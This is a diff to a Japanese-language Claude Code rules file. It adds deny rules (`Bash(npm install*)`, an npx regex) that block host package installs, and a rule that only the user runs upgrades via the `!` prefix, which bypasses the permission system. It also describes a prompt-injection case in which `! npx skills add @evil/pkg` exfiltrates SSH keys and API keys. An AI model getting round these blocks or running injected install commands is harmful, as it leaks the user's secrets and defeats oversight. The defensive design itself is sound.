@@ -34,6 +34,18 @@
   Batch 1 [T1-T3]: BE API追加 → fast_verify: `curl localhost:8000/api/new-endpoint`
   Batch 2 [T4-T5]: FE連携 → fast_verify: `Playwright: browser_navigate → console_messages`
 
+### Claude Code upgrade（ホスト npm/pip の特殊ケース）
+Claude Code 自身の upgrade は **ユーザーが `!` プレフィックスで直接実行**すること。
+```bash
+! npm install -g @anthropic-ai/claude-code@latest
+```
+**理由（アーキテクチャ制約）**: `settings.json` の `permissions.deny: ["Bash(npm install*)"]` は公式仕様 "deny rules always take precedence" により hook の ALLOW_PATTERNS より先に評価される。AI 経由でのホスト npm install は構造上実行不可能。`!` プレフィックスは Claude Code のパーミッションシステムをバイパスし、セッションシェルで直接コマンドを実行する唯一の方法。
+**AI が `! npm install` を自律発火することは禁止。** ユーザーの明示的な指示がある場合のみ、上記コマンドをユーザーにコピーして伝える。
+
+### npx skills (find-skills スキル) も同型
+`! npx skills find/add/check/update` も `block-host-installs.py` の DENY パターン `\bnpx\s+\S` で全 npx がブロックされる構造のため、AI 経由実行は不可能。`find-skills` スキル発動時は `! npx skills <verb> ...` の形でユーザーに**提示するのみ**。AI 自律発火禁止。
+**追加リスク**: `npx skills add` の npm `postinstall` は任意コード実行が可能なため、Prompt Injection 経由で `! npx skills add @evil/pkg` を踏むと SSH 鍵・`~/.mcp.json` (APIキー)・`~/.zshrc` が外部送信されうる。AI 経路を構造的に閉じる設計は意図的。
+
 ### 参照
 
 SubAgent委託、デバッグ、リファクタリング、データ分析の詳細: `execution-patterns` スキル参照。
@@ -44,3 +56,8 @@ SubAgent委託、デバッグ、リファクタリング、データ分析の詳
 - **計画に検証ステップがあれば必ず実行する**。計画自身が定義した検証項目をスキップしない
 - BE変更: サーバー再起動 + APIエンドポイント疎通確認
 - FE変更: ブラウザでページリロード + コンソールエラーゼロ確認 + 変更機能の動作確認
+## 新規禁止ルールの追加先優先順位
+
+1. `permissions.deny` への glob 追加が第一選択
+2. syntactic では不十分（文脈・頻度・プラン整合性）の場合のみ hook 化
+3. hook と deny の二重防御は意図的（LLM classifier 確率的判定の補完）
